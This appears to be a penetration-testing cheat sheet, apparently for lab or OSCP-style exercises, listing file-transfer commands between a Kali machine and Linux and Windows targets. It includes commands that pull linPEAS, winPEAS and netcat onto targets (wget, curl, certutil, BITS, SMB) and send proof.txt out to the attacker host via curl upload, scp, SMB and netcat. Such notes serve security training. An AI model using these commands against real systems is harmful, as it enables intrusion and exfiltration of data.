## Transfers

### Serve from Kali

```bash
# Serve the current directory over HTTP.
python3 -m http.server 8000 --bind "$LHOST"
# Serve the current directory over authenticated SMB.
sudo impacket-smbserver share "$PWD" -smb2support -username kali -password kali
# Start an HTTP upload receiver.
python3 -m uploadserver 8000
```

### Linux target

```bash
# Download linPEAS with Wget.
wget "http://192.168.45.155:8000/linpeas.sh" -O linpeas.sh
# Download linPEAS with cURL.
curl -o linpeas.sh "http://192.168.45.155:8000/linpeas.sh"
# Copy proof.txt from the target over SSH.
scp pete@192.168.50.20:/tmp/proof.txt proof.txt
# Upload proof.txt to the HTTP receiver.
curl -F 'files=@proof.txt' http://192.168.45.155:8000/upload
```

### Windows target

```powershell
# Download winPEAS with PowerShell.
Invoke-WebRequest 'http://192.168.45.155:8000/winPEASx64.exe' -OutFile C:\Windows\Temp\winpeas.exe
# Download Netcat with Certutil.
certutil.exe -urlcache -split -f http://192.168.45.155:8000/nc.exe C:\Windows\Temp\nc.exe
# Download a tool with BITS.
Start-BitsTransfer -Source 'http://192.168.45.155:8000/tool.exe' -Destination 'C:\Windows\Temp\tool.exe'
# Copy a tool from the Kali SMB share.
copy \\192.168.45.155\share\tool.exe C:\Windows\Temp\tool.exe
# Copy proof.txt back to the Kali SMB share.
copy C:\Windows\Temp\proof.txt \\192.168.45.155\share\proof.txt
```

### Netcat

```bash
# Kali receiver
# Receive proof.txt on port 9001.
nc -lvnp 9001 > proof.txt

# Linux sender
# Send proof.txt to Kali.
nc 192.168.45.155 9001 < /tmp/proof.txt
```

### Verify

```bash
# Calculate the local SHA-256 hash.
sha256sum tool.exe
```

```powershell
# Calculate the Windows SHA-256 hash.
Get-FileHash C:\Windows\Temp\tool.exe -Algorithm SHA256
```

### Metadata

```bash
# Identify the file type.
file tool.exe
# Read file metadata.
exiftool tool.exe
# Preview printable strings.
strings -a tool.exe | head
```
